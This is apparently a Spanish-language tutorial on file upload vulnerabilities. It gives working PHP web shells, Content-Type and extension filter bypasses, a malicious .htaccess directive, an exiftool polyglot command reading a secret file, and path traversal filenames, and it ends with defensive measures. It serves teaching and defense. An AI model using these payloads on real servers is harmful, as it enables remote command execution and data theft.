
# Vulnerabilidades de Subida de Archivos (File Upload)


Las vulnerabilidades de subida de archivos ocurren cuando un servidor permite a los usuarios subir ficheros sin validar adecuadamente su tipo, contenido, nombre o ubicación. Esto puede permitir a un atacante subir un *web shell* y tomar control total del servidor.

## 📈 El Objetivo: El Web Shell

El objetivo final de un atacante es subir un fichero (comúnmente en PHP, ASP, JSP, etc.) que pueda ejecutar comandos en el servidor. A esto se le llama *web shell*.

**Web Shell Básico (Ejecución de comandos):**
Permite ejecutar comandos del sistema a través de un parámetro en la URL, como `?command=whoami`.
```php
<?php
  // Permite ejecutar cualquier comando pasado por el parámetro 'command'
  echo system($_GET['command']);
?>
````

**Web Shell Básico (Lectura de archivos):**
Permite leer el contenido de archivos sensibles del servidor, como `?path=/etc/passwd`.

```php
<?php
  // Muestra el contenido de un fichero especificado en el parámetro 'path'
  echo file_get_contents($_GET['path']);
?>
```

**Ejemplo de uso (Post-Explotación):**
Una vez subido el shell (ej. `exploit.php`), el atacante puede interactuar con él:

```bash
GET /uploads/exploit.php?command=id HTTP/1.1
Host: tu-sitio-vulnerable.com
```

-----

## 📂 Vectores de Ataque y Técnicas de Bypass

Los atacantes usan varias técnicas para evadir los filtros de seguridad.

### 1\. Bypass de Filtro de Content-Type

El servidor confía en la cabecera `Content-Type` enviada por el cliente para identificar el tipo de archivo. Un atacante puede interceptar la petición y cambiarla.

**Petición vulnerable:** El servidor bloquea `application/x-php`.

```http
------WebKitFormBoundarywLN6FMuuATABDzow
Content-Disposition: form-data; name="avatar"; filename="amego.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>
------WebKitFormBoundarywLN6FMuuATABDzow
```

**Petición modificada (Bypass):** El atacante cambia el `Content-Type` a uno permitido, como `image/jpeg`. Si el servidor no valida el contenido real del fichero, el shell será subido.

```http
------WebKitFormBoundarywLN6FMuuATABDzow
Content-Disposition: form-data; name="avatar"; filename="amego.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
------WebKitFormBoundarywLN6FMuuATABDzow
```

### 2\. Bypass de Filtro de Extensión (Lista Negra)

El servidor tiene una "lista negra" de extensiones peligrosas (ej. `.php`, `.phtml`). El atacante busca extensiones alternativas o formas de ofuscar el nombre.

  * **Extensiones alternativas:** Algunos servidores Apache mal configurados pueden ejecutar `.php5`, `.php7`, `.phtml`, etc.
  * **Ofuscación de mayúsculas:** `exploit.Php` (si el servidor es sensible a mayúsculas y minúsculas).
  * **Extensiones dobles:** `exploit.php.jpg` (si el servidor solo comprueba la última extensión de forma incorrecta).
  * **Punto al final:** `exploit.php.` (en sistemas Windows, el punto final a veces se ignora).
  * **Null Byte Injection (obsoleto pero histórico):** `exploit.php%00.jpg`. El `%00` (carácter nulo) hacía que el backend (escrito en C/C++) interpretara el final de la cadena en `exploit.php`, mientras que el frontend veía la extensión `.jpg`.
  * **Otras ofuscaciones:** `exploit%2Ephp` (URL encode), `exploit.asp;.jpg` (común en IIS).

### 3\. Bypass de Configuración de Apache (.htaccess)

Este es un ataque muy efectivo si el servidor permite subir ficheros `.htaccess`.

**Condición:** El servidor Apache debe tener `AllowOverride All` (o `AllowOverride FileInfo`) habilitado para el directorio de subidas.

**Pasos del ataque:**

1.  **Subir un `.htaccess` malicioso:**
      * `filename` se cambia a `.htaccess`
      * `Content-Type` se cambia a `text/plain`
      * El contenido del fichero se reemplaza por una directiva de Apache:
        ```apache
        # Trata cualquier fichero con la extensión .l33t como si fuera PHP
        AddType application/x-httpd-php .l33t
        ```
2.  **Subir el Web Shell:**
      * El atacante ahora sube su shell con la extensión personalizada: `exploit.l33t`.
      * El filtro de la aplicación (que busca `.php`) ignora este fichero.
3.  **Ejecución:**
      * Cuando el atacante visita `/uploads/exploit.l33t`, Apache lee el `.htaccess` malicioso y ejecuta el fichero como código PHP.

### 4\. Bypass de Validación de Contenido (Magic Bytes)

Algunos filtros avanzados leen los primeros bytes de un fichero para verificar que "parece" una imagen (ej. un JPEG siempre empieza con `FF D8 FF`).

Un atacante puede crear un fichero "políglota" que sea a la vez una imagen válida y un web shell válido.

**Técnica (Usando `exiftool`):** Se inyecta el código PHP en un campo de metadatos (como un comentario) de una imagen real.

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" mi-imagen-real.jpg -o polyglot.php
```

  * `polyglot.php` es una imagen JPEG válida.
  * También contiene código PHP que se ejecutará si el servidor está configurado para ejecutar ficheros `.php` (o si se combina con el ataque `.htaccess`).

### 5\. Path Traversal

Si la aplicación es vulnerable a Path Traversal, el atacante puede intentar subir el fichero fuera del directorio de imágenes (que no tiene permisos de ejecución) a un directorio que sí los tenga.

  * `filename="../exploit.php"`
  * `filename="..%2fexploit.php"` (codificado en URL)

-----

## 🛡️ Buenas Prácticas y Medidas de Defensa

Para prevenir estas vulnerabilidades, **NUNCA** confíes en los datos del usuario.

  * ✅ **Usar una Lista Blanca (Whitelist) de Extensiones:** En lugar de una lista negra (bloquear `.php`), usa una lista blanca (permitir solo `.jpg`, `.png`, `.gif`). Es mucho más seguro.
    
  * ✅ **Renombrar Ficheros al Subir:** Guarda los ficheros subidos con un nombre aleatorio y seguro (ej. un UUID o un hash) y almacena el nombre original en la base de datos. Esto previene ataques de extensión (`exploit.php`) y colisiones.
      * `avatar-del-usuario.jpg` -\> `a3f9b1d8-0c7e-4b2a-8f0e-3d9c1b7a4c0f.jpg`
  * ✅ **Deshabilitar la Ejecución de Scripts en el Directorio de Subidas:** Esta es la medida más importante. Configura tu servidor web (Apache, Nginx) para que **NUNCA** ejecute código (PHP, etc.) en el directorio de `uploads`. Los ficheros en esta ruta solo deben servirse como contenido estático (`text/plain`, `image/jpeg`, etc.).
  * ✅ **Deshabilitar `.htaccess` en Directorios de Subida:** En la configuración de Apache, usa `AllowOverride None` para el directorio de subidas. Esto neutraliza el ataque de `.htaccess`.
  * ✅ **Validar el Contenido Real del Fichero:** No confíes en el `Content-Type` ni en los *magic bytes*. Si esperas una imagen, usa una librería (como GD o ImageMagick en PHP) para volver a procesar y guardar la imagen. Esto limpiará cualquier código malicioso inyectado en los metadatos.
  * ✅ **Servir Ficheros desde un Dominio Diferente:** Sube los ficheros a un subdominio de solo contenido estático (ej. `media.tusitio.com`) o a un servicio de *bucket* (como Amazon S3). Esto ayuda a prevenir ataques de XSS y a asegurar que el contenido se sirve con el tipo MIME correcto y sin permisos de ejecución.
  * 🚫 **Validar el Nombre del Fichero:** Asegúrate de que el nombre del fichero no contenga secuencias de *path traversal* (`../`) ni caracteres especiales.

<!-- end list -->
